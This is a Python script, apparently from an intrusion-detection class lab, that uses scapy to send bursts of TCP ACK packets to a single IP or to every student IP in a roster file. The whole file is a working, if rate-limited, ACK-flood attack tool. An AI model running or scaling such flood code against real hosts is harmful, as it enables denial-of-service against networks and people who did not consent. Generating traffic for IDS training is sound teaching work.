import json
import argparse
import random
import time
import os
import sys

# ===== LAB CONSTANTS (DO NOT CHANGE IN CLASS) =====
DEST_PORT = 3333
PACKET_COUNT = 100        # good IDS-friendly default
SLEEP_TIME = 0.01
# =================================================

# Import scapy only when available
try:
    from scapy.all import IP, TCP, send
except ImportError:
    IP = TCP = send = None


def load_roster(path):
    """Read and decode a JSON roster file into a dictionary."""
    with open(path, 'r') as f:
        return json.load(f)


def ack_flood(dest_ip):
    """Send a burst of TCP ACK packets to the specified target."""
    if IP is None:
        print("Scapy is required to send packets.")
        return

    print("Starting ACK flood to {}:{} ({} packets)".format(
        dest_ip, DEST_PORT, PACKET_COUNT))

    for i in range(PACKET_COUNT):
        src_port = random.randint(1024, 65535)

        pkt = IP(dst=dest_ip) / TCP(
            sport=src_port,
            dport=DEST_PORT,
            flags="A"
        )

        send(pkt, verbose=False)

        if (i + 1) % 50 == 0:
            print("  Sent {} packets".format(i + 1))

        time.sleep(SLEEP_TIME)

    print("Finished sending to {}".format(dest_ip))


def attack_group(group_name, roster):
    if group_name not in roster:
        print("Group not found:", group_name)
        return

    group = roster[group_name]

    for student, ip in group.items():
        print("Attacking {} -> {}".format(student, ip))
        ack_flood(ip)


def main():
    parser = argparse.ArgumentParser(
        description="ACK traffic generator (lab use only)"
    )

    parser.add_argument(
        "--roster",
        default="ids_sec3_students.json",
        help="Roster JSON file"
    )

    parser.add_argument("--target-group", help="Group name (e.g., group1)")
    parser.add_argument("--target-ip", help="Single IP (e.g., 192.168.2.26)")

    args = parser.parse_args()

    # Root check (Linux/macOS)
    if IP is not None and hasattr(os, "geteuid"):
        if os.geteuid() != 0:
            print("Run as root to send packets.")
            sys.exit(1)

    roster = {}

    if args.target_group:
        if not os.path.exists(args.roster):
            print("Roster file not found:", args.roster)
            return
        roster = load_roster(args.roster)

    if args.target_ip:
        ack_flood(args.target_ip)

    if args.target_group:
        attack_group(args.target_group, roster)

    if not args.target_ip and not args.target_group:
        print("Use --target-group <name> or --target-ip <ip>")


if __name__ == "__main__":
    main()
